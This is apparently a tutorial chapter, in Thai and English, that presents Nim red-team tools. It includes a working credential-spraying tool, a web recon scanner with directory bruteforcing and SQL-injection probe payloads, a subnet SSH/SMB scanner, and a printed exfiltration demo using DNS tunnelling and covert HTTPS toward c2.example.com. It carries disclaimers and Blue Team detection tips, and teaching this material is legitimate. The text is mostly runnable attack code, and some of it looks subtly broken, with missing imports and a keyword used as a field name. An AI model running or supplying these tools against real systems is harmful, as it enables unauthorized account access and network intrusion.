# Part 59 - Offensive Security Tooling in Nim (Educational)

## คำเตือนสำคัญ / CRITICAL DISCLAIMER

> **สำหรับการศึกษา, CTF, Authorized Penetration Testing และ Defensive Security Research เท่านั้น**
> เครื่องมือทั้งหมดในส่วนนี้อยู่ในสภาพที่ควบคุมดูแลโดย security professionals
> ห้ามใช้โจมตีระบบโดยไม่ได้รับอนุญาตโดยเด็ดขาด

---

## บทนำ Red Team Tooling

Red Team tools ช่วย defenders เข้าใจ attacker perspective:
- Attack surfaces สำหรับ Blue Team การ defend
- Detection และ monitoring improvements
- Security control validation

---

## 1. Credential Spray Tool

```nim
# cred_spray.nim
# Authorized credential testing tool for password policy assessment
# ใช้เพื่อทดสอบ password policies ในสภาพที่ได้รับอนุญาตเท่านั้น

import std/[asyncdispatch, asynchttpserver, httpclient, json, strformat]
import std/[times, tables, strutils, sequtils]

type
  SprayConfig* = object
    targetUrl*: string
    usernames*: seq[string]
    passwords*: seq[string]
    delayMs*: int      # Delay between attempts (avoid lockout)
    batchSize*: int    # Users per batch
    timeout*: int      # Request timeout ms
    authType*: string  # "form", "basic", "jwt"
    verbose*: bool

  SprayResult* = object
    username*: string
    password*: string
    success*: bool
    statusCode*: int
    responseTime*: float

  SprayReport* = object
    startTime*: DateTime
    endTime*: DateTime
    totalAttempts*: int
    successCount*: int
    results*: seq[SprayResult]
    lockedAccounts*: seq[string]

proc newSprayConfig*(targetUrl: string): SprayConfig =
  SprayConfig(
    targetUrl: targetUrl,
    delayMs: 3000,    # 3 second delay by default
    batchSize: 1,     # One user at a time
    timeout: 10000,
    authType: "form",
    verbose: false
  )

proc testFormAuth*(config: SprayConfig, username, password: string): Future[SprayResult] {.async.} =
  var result = SprayResult(username: username, password: password)
  
  let client = newAsyncHttpClient()
  defer: client.close()
  client.timeout = config.timeout
  
  let startTime = epochTime()
  
  try:
    let body = &"username={encodeUrl(username)}&password={encodeUrl(password)}"
    var headers = newHttpHeaders()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    headers["User-Agent"] = "Mozilla/5.0 (Assessment Tool)"
    
    let resp = await client.request(config.targetUrl,
      httpMethod = HttpPost,
      body = body,
      headers = headers
    )
    
    result.statusCode = resp.code.int
    result.responseTime = epochTime() - startTime
    
    # Success indicators (customize per application)
    let respBody = await resp.body
    result.success = resp.code == Http302 or  # Redirect = success
                     "dashboard" in respBody or
                     "logout" in respBody or
                     (resp.code == Http200 and "invalid" notin respBody.toLower)
  except:
    result.success = false
    result.responseTime = epochTime() - startTime
  
  return result

proc testBasicAuth*(config: SprayConfig, username, password: string): Future[SprayResult] {.async.} =
  var result = SprayResult(username: username, password: password)
  
  let client = newAsyncHttpClient()
  defer: client.close()
  
  let startTime = epochTime()
  
  try:
    var headers = newHttpHeaders()
    let creds = encode(username & ":" & password)  # base64
    headers["Authorization"] = &"Basic {creds}"
    
    let resp = await client.request(config.targetUrl, headers = headers)
    result.statusCode = resp.code.int
    result.responseTime = epochTime() - startTime
    result.success = resp.code == Http200
  except:
    result.success = false
  
  return result

proc runSpray*(config: SprayConfig): Future[SprayReport] {.async.} =
  ## Execute credential spray with configurable delay
  var report = SprayReport(
    startTime: now(),
    results: @[],
    lockedAccounts: @[]
  )
  
  echo &"Starting credential spray: {config.usernames.len} users x {config.passwords.len} passwords"
  echo &"Target: {config.targetUrl}"
  echo &"Delay between attempts: {config.delayMs}ms"
  echo "\n[WARNING] Ensure you have written authorization before proceeding.\n"
  
  for password in config.passwords:
    echo &"\n[*] Testing password: {password}"
    
    for i in countup(0, config.usernames.len - 1, config.batchSize):
      let batch = config.usernames[i..min(i + config.batchSize - 1, config.usernames.len - 1)]
      
      for username in batch:
        if username in report.lockedAccounts:
          continue
        
        let result = case config.authType
          of "basic": await testBasicAuth(config, username, password)
          else: await testFormAuth(config, username, password)
        
        report.results.add(result)
        inc report.totalAttempts
        
        if result.success:
          inc report.successCount
          echo &"  [SUCCESS] {username}:{password}"
        elif result.statusCode == 423 or result.statusCode == 429:
          report.lockedAccounts.add(username)
          echo &"  [LOCKED] {username}"
        elif config.verbose:
          echo &"  [FAIL] {username} ({result.statusCode})"
        
        # Rate limiting delay
        await sleepAsync(config.delayMs)
  
  report.endTime = now()
  return report

proc printReport*(report: SprayReport) =
  echo "\n=== Credential Spray Report ==="
  echo &"Duration: {(report.endTime - report.startTime).inSeconds}s"
  echo &"Total attempts: {report.totalAttempts}"
  echo &"Successful: {report.successCount}"
  echo &"Locked accounts: {report.lockedAccounts.len}"
  
  if report.successCount > 0:
    echo "\n[+] Valid Credentials Found:"
    for r in report.results:
      if r.success:
        echo &"  {r.username}:{r.password}"
  
  if report.lockedAccounts.len > 0:
    echo "\n[!] Locked Accounts (stop testing these):"
    for acc in report.lockedAccounts:
      echo &"  {acc}"

when isMainModule:
  echo "Credential Spray Tool (Authorized Use Only)"
  echo "============================================"
  echo "REQUIRES WRITTEN AUTHORIZATION\n"
  
  # Demo with local test server
  var config = newSprayConfig("http://localhost:3000/login")
  config.usernames = @["admin", "user1", "user2"]
  config.passwords = @["Password1", "Welcome1", "Summer2024"]
  config.delayMs = 1000
  config.verbose = true
  
  let report = waitFor runSpray(config)
  printReport(report)
```

---

## 2. Web Application Recon

```nim
# webapp_recon.nim
# Web application reconnaissance for authorized assessments

import std/[asyncdispatch, httpclient, json, strformat, strutils, tables, sets]
import std/[uri, sequtils, times]

type
  ReconTarget* = object
    baseUrl*: string
    discovered*: HashSet[string]
    forms*: seq[JsonNode]
    headers*: seq[tuple[url: string, headers: Table[string, string]]]
    technologies*: seq[string]
    endpoints*: seq[string]

proc detectTechnology*(headers: Table[string, string], body: string): seq[string] =
  result = @[]
  
  # Server detection
  if "X-Powered-By" in headers:
    result.add(&"Server: {headers[\"X-Powered-By\"]}")  
  if "Server" in headers:
    result.add(&"Web Server: {headers[\"Server\"]}")  
  
  # Framework fingerprinting from body
  let checks = [
    ("WordPress", "wp-content"),
    ("Drupal", "Drupal.settings"),
    ("Joomla", "Joomla!"),
    ("React", "__reactFiber"),
    ("Vue.js", "__vue_app__"),
    ("Angular", "ng-version"),
    ("jQuery", "jquery.min.js"),
    ("Bootstrap", "bootstrap.min.css"),
    ("Laravel", "laravel_session"),
    ("Rails", "_rails_session"),
    ("Django", "csrftoken"),
    ("Express", "X-Powered-By: Express"),
    ("ASP.NET", "__VIEWSTATE"),
    ("PHP", ".php"),
  ]
  
  let bodyLower = body.toLower()
  for (tech, indicator) in checks:
    if indicator.toLower() in bodyLower:
      if tech notin result:
        result.add(tech)

proc crawlPage*(client: AsyncHttpClient, url: string):
    Future[tuple[status: int, body: string, links: seq[string]]] {.async.} =
  result.links = @[]
  
  try:
    let resp = await client.get(url)
    result.status = resp.code.int
    result.body = await resp.body
    
    # Extract links (simple regex-based extraction)
    var pos = 0
    let bodyStr = result.body
    let hrefPattern = "href=\""
    
    while true:
      let idx = bodyStr.find(hrefPattern, pos)
      if idx < 0: break
      let start = idx + hrefPattern.len
      let endIdx = bodyStr.find('"', start)
      if endIdx > start:
        let link = bodyStr[start..endIdx-1]
        if link.startsWith("http") or link.startsWith("/"):
          result.links.add(link)
      pos = idx + 1
  except Exception as e:
    result.status = 0
    result.body = e.msg

proc discoverDirectories*(baseUrl: string,
                          wordlist: seq[string]): Future[seq[string]] {.async.} =
  ## Directory/endpoint bruteforce
  result = @[]
  
  let client = newAsyncHttpClient()
  defer: client.close()
  client.timeout = 5000
  
  echo &"Discovering directories on {baseUrl}..."
  
  for word in wordlist:
    let url = baseUrl.strip(trailing = true, chars = {'/'}) & "/" & word
    try:
      let resp = await client.head(url)
      if resp.code.int != 404:
        echo &"  [{resp.code.int}] {url}"
        result.add(url)
    except:
      discard
    await sleepAsync(100)  # Polite delay

proc checkSecurityHeaders*(url: string): Future[seq[tuple[header: string, status: string]]] {.async.} =
  ## Check for security headers
  result = @[]
  
  let client = newAsyncHttpClient()
  defer: client.close()
  
  let resp = await client.get(url)
  let headers = resp.headers
  
  let secHeaders = [
    ("Strict-Transport-Security", "HSTS prevents protocol downgrade"),
    ("Content-Security-Policy", "CSP prevents XSS"),
    ("X-Frame-Options", "Prevents clickjacking"),
    ("X-Content-Type-Options", "Prevents MIME sniffing"),
    ("Referrer-Policy", "Controls referrer info"),
    ("Permissions-Policy", "Controls browser features"),
    ("X-XSS-Protection", "Legacy XSS filter (deprecated)"),
  ]
  
  for (header, desc) in secHeaders:
    if headers.hasKey(header):
      result.add((header, &"PRESENT: {headers[header]}"))
    else:
      result.add((header, &"MISSING ({desc})"))

proc scanParameters*(url: string): Future[seq[string]] {.async.} =
  ## Find injectable parameters by testing for errors
  result = @[]
  
  let client = newAsyncHttpClient()
  defer: client.close()
  
  let testPayloads = ["'", "\"", "<", ";", "--", "1/0", "AND 1=1"]
  
  for payload in testPayloads:
    try:
      let testUrl = url & "?id=" & encodeUrl(payload)
      let resp = await client.get(testUrl)
      let body = await resp.body
      
      # Look for error indicators
      let errorIndicators = [
        "SQL", "ORA-", "MySQL", "syntax error",
        "ODBC", "Exception", "stack trace",
        "Uncaught", "Fatal error"
      ]
      
      for indicator in errorIndicators:
        if indicator.toLower() in body.toLower():
          result.add(&"Possible {indicator} error with payload: {payload}")
          break
    except:
      discard
    
    await sleepAsync(200)

when isMainModule:
  echo "Web Application Recon Tool"
  echo "=========================="
  echo "For authorized assessments only.\n"
  
  if paramCount() < 1:
    echo "Usage: webapp_recon <target_url>"
    quit(1)
  
  let targetUrl = paramStr(1)
  echo &"Target: {targetUrl}"
  
  # Check security headers
  echo "\n[*] Security Headers:"
  let secHeaders = waitFor checkSecurityHeaders(targetUrl)
  for (header, status) in secHeaders:
    let icon = if "PRESENT" in status: "[+]" else: "[-]"
    echo &"  {icon} {header}: {status}"
  
  # Directory discovery with common paths
  let commonDirs = [
    "admin", "api", "login", "dashboard", "backup",
    "config", "wp-admin", "phpmyadmin", "console",
    "swagger", "docs", "api/v1", ".git", ".env"
  ]
  
  echo "\n[*] Directory Discovery:"
  let found = waitFor discoverDirectories(targetUrl, @commonDirs)
  echo &"  Found {found.len} accessible paths"
```

---

## 3. Lateral Movement Simulation

```nim
# lateral_movement_sim.nim
# Simulate lateral movement for red team assessments
# ใช้ simulate attacks ใน authorized environments เท่านั้น

import std/[asyncdispatch, asyncnet, strformat, tables, sets, json]

type
  NetworkNode* = object
    ip*: string
    hostname*: string
    openPorts*: seq[int]
    os*: string
    services*: Table[int, string]
    isCompromised*: bool
    accessLevel*: string  # "user", "admin", "system"

  LateralPath* = object
    source*: string
    target*: string
    technique*: string
    credential*: string
    success*: bool

  SimulationReport* = object
    startNode*: string
    visitedNodes*: seq[string]
    paths*: seq[LateralPath]
    totalTime*: float

proc checkSMBConnection*(ip: string, port = 445): Future[bool] {.async.} =
  ## Check if SMB port is reachable
  let sock = newAsyncSocket()
  try:
    await withTimeout(sock.connect(ip, Port(port)), 3000)
    result = true
  except:
    result = false
  finally:
    sock.close()

proc checkSSHConnection*(ip: string, port = 22): Future[bool] {.async.} =
  let sock = newAsyncSocket()
  try:
    await withTimeout(sock.connect(ip, Port(port)), 3000)
    # Read SSH banner
    let banner = await sock.recvLine()
    result = banner.startsWith("SSH-")
  except:
    result = false
  finally:
    sock.close()

proc discoverAdjacentNodes*(currentIp: string, subnet: string): Future[seq[NetworkNode]] {.async.} =
  ## Discover reachable nodes from current position
  result = @[]
  
  # Parse subnet (simplified: assume /24)
  let parts = currentIp.split(".")
  if parts.len != 4: return
  let base = parts[0..2].join(".")
  
  var futures: seq[Future[tuple[ip: string, ssh, smb: bool]]]
  
  for i in 1..254:
    let ip = &"{base}.{i}"
    let f = (proc(targetIp: string): Future[tuple[ip: string, ssh, smb: bool]] {.async.} =
      let ssh = await checkSSHConnection(targetIp)
      let smb = await checkSMBConnection(targetIp)
      return (targetIp, ssh, smb)
    )(ip)
    futures.add(f)
  
  let results = await all(futures)
  
  for (ip, sshOpen, smbOpen) in results:
    if sshOpen or smbOpen:
      var node = NetworkNode(ip: ip, isCompromised: false)
      if sshOpen: node.openPorts.add(22)
      if smbOpen: node.openPorts.add(445)
      result.add(node)

proc simulateLateralPath*(src, dst: NetworkNode): LateralPath =
  ## Determine likely lateral movement technique
  result.source = src.ip
  result.target = dst.ip
  
  if 445 in dst.openPorts:
    result.technique = "SMB/PsExec"
    result.credential = "[harvested_credential]"
  elif 22 in dst.openPorts:
    result.technique = "SSH with key/credential"
    result.credential = "[ssh_key]"
  elif 5985 in dst.openPorts:
    result.technique = "WinRM/PowerShell Remoting"
    result.credential = "[credential]"
  elif 3389 in dst.openPorts:
    result.technique = "RDP"
    result.credential = "[credential]"
  else:
    result.technique = "Unknown"

proc generateSimulationReport*(report: SimulationReport): string =
  var r = ""
  r.add("# Lateral Movement Simulation Report\n\n")
  r.add(&"Start node: {report.startNode}\n")
  r.add(&"Nodes visited: {report.visitedNodes.len}\n")
  r.add(&"Total time: {report.totalTime:.2f}s\n\n")
  
  r.add("## Movement Paths\n\n")
  for path in report.paths:
    let icon = if path.success: "[SUCCESS]" else: "[FAILED]"
    r.add(&"{icon} {path.source} -> {path.target}\n")
    r.add(&"  Technique: {path.technique}\n")
  
  r.add("\n## Recommendations for Blue Team\n\n")
  r.add("- Monitor SMB connections between workstations\n")
  r.add("- Disable WinRM where not needed\n")
  r.add("- Implement network segmentation\n")
  r.add("- Enable detailed logon event auditing (Event ID 4624, 4625)\n")
  r.add("- Deploy honeypot credentials to detect credential harvesting\n")
  
  result = r

when isMainModule:
  echo "Lateral Movement Simulator (Authorized Use Only)"
  echo "================================================"
  echo "REQUIRES WRITTEN AUTHORIZATION\n"
  
  if paramCount() < 1:
    echo "Usage: lateral_sim <start_ip>"
    echo "Example: lateral_sim 192.168.1.100"
    quit(1)
  
  let startIp = paramStr(1)
  echo &"Starting from: {startIp}"
  echo "Discovering adjacent nodes...\n"
  
  let adjacent = waitFor discoverAdjacentNodes(startIp, "192.168.1.0/24")
  echo &"Found {adjacent.len} reachable nodes:"
  
  for node in adjacent:
    echo &"  {node.ip} ports: {node.openPorts}"
  
  echo "\nBlue Team Recommendations:"
  echo "- Monitor lateral movement indicators"
  echo "- Review network segmentation"
  echo "- Check Windows Event Logs for anomalies"
```

---

## 4. Exfiltration Simulation

```nim
# exfil_sim.nim
# Simulate data exfiltration techniques for authorized red team assessments
# Helps defenders understand what to monitor

import std/[asyncdispatch, asyncnet, httpclient, base64, strformat, json]
import std/[times, strutils, math]

type
  ExfilMethod* = enum
    emDNS = "DNS tunneling"
    emHTTPS = "HTTPS covert channel"
    emICMP = "ICMP tunneling"
    emSteganography = "File steganography"

  ExfilSimulator* = object
    method*: ExfilMethod
    chunkSize*: int  # bytes per packet
    delayMs*: int    # delay between packets
    destination*: string

proc simulateDNSTunnel*(data: string, domain: string) =
  ## Simulate DNS exfiltration pattern
  ## Blue team: monitor for high volume of DNS queries to single domain
  let encoded = encode(data)  # base64
  let chunkSize = 40  # DNS label max 63 chars, safer to use 40
  
  var chunks: seq[string]
  var i = 0
  while i < encoded.len:
    chunks.add(encoded[i..min(i + chunkSize - 1, encoded.len - 1)])
    i += chunkSize
  
  echo &"[DNS Tunnel Sim] Exfiltrating {data.len} bytes via {chunks.len} DNS queries"
  for i, chunk in chunks:
    let subdomain = &"{i}-{chunk}.{domain}"
    echo &"  Query: {subdomain}"
    # In real implementation: nslookup or socket DNS call

proc simulateHTTPSCovertChannel*(data: string, serverUrl: string) =
  ## Simulate HTTPS-based covert channel
  ## Data hidden in seemingly legitimate HTTP traffic
  let encoded = encode(data)
  
  # Split into "innocent-looking" requests
  let chunkSize = 256
  var chunks: seq[string]
  var i = 0
  while i < encoded.len:
    chunks.add(encoded[i..min(i + chunkSize - 1, encoded.len - 1)])
    i += chunkSize
  
  echo &"[HTTPS Covert] Exfiltrating via {chunks.len} requests to {serverUrl}"
  
  for i, chunk in chunks:
    # Disguise as image request
    let url = &"{serverUrl}/images/product_{i}_{now().format(\"HHmmss\")}.jpg"
    echo &"  GET {url} (X-Custom: {chunk[0..min(15, chunk.len-1)]}...)"
    # Headers would carry encoded data in a real attack

proc simulateSteganography*(data: string, imagePath: string): string =
  ## Simulate LSB steganography in images
  ## Real implementation would modify pixel LSBs
  let encoded = data.mapIt(it.ord).mapIt(&"{it:08b}").join("")
  echo &"[Stego Sim] {data.len} bytes -> {encoded.len} bits to embed in {imagePath}"
  echo "  Would modify LSBs of pixel values to hide data"
  echo &"  Minimum image size needed: {encoded.len div 3} pixels (RGB)"
  result = imagePath & ".stego.png"

proc detectExfiltrationIndicators*() =
  ## Blue Team detection guide
  echo "\n=== Detection Indicators for Blue Team ==="
  echo ""
  echo "DNS Tunneling:"
  echo "  - Unusually long subdomain names (> 50 chars)"
  echo "  - High volume of DNS queries to single external domain"
  echo "  - Non-existent TLD queries"
  echo "  - Monitor: Zeek/Suricata DNS logs, Windows DNS debug logging"
  echo ""
  echo "HTTPS Covert Channels:"
  echo "  - Unusual HTTP headers (X-Custom, non-standard names)"
  echo "  - High entropy request bodies"
  echo "  - Frequent small requests to same external IP"
  echo "  - Monitor: Proxy logs, SSL inspection, flow analysis"
  echo ""
  echo "Steganography:"
  echo "  - Unusual file sizes for images"
  echo "  - Files uploaded/downloaded in unusual times"
  echo "  - Monitor: DLP solutions, file hash monitoring"
  echo ""
  echo "General Indicators:"
  echo "  - Unusual outbound data volumes"
  echo "  - Connections to new/unknown external IPs"
  echo "  - Processes making unexpected network connections"
  echo "  - Tools: Zeek, Suricata, Elastic, Splunk"

when isMainModule:
  echo "Exfiltration Simulation Tool (Authorized Use Only)"
  echo "==================================================="
  echo "For red team exercises and detection validation only.\n"
  
  let sampleData = "This is simulated sensitive data for red team exercise"
  
  simulateDNSTunnel(sampleData, "c2.example.com")
  echo ""
  simulateHTTPSCovertChannel(sampleData, "https://c2.example.com")
  echo ""
  let stegoFile = simulateSteganography(sampleData, "image.png")
  echo &"  Output would be: {stegoFile}"
  
  detectExfiltrationIndicators()
```

---

## สรุป Part 59

| เครื่องมือ | จุดประสงค์ |
|-----------|----------|
| `cred_spray.nim` | ทดสอบ password policies |
| `webapp_recon.nim` | Automated web app reconnaissance |
| `lateral_movement_sim.nim` | Simulate lateral movement paths |
| `exfil_sim.nim` | Exfiltration technique simulation |

### Key Blue Team Takeaways

1. **Slow credential sprays** — ตรวจจับด้วย rate-based lockout และ SIEM alerts
2. **SMB lateral movement** — Monitor event IDs 4648, 4624 logon type 3
3. **DNS tunneling** — Watch สำหรับ long subdomain names
4. **HTTPS covert** — SSL inspection + DPI ช่วยตรวจจับ

**Next**: [Part 60 - Network Attack Defense Concepts](part60_network_defense.md)
